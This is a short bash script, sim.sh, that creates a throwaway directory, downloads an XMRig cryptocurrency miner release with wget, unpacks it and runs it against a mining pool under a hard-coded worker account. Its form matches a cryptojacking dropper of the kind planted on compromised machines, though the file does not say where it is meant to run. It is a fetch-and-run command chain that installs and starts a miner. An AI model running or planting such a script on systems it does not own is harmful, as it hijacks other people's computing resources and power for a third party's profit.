
sim.sh


#! /bin/bash
  
mkdir kanxck && cd kanxck && wget http://github.com/xmrig/xmrig/releases/download/v2.14.0/xmrig-2.14.0-xenial-x64.tar.gz && tar xf xmrig-2.14.0-xenial-x64.tar.gz

cd xmrig-2.14.0

./xmrig -o pool.simpleco.in:8081 -u  TheCuddleDoodle.32893 -p x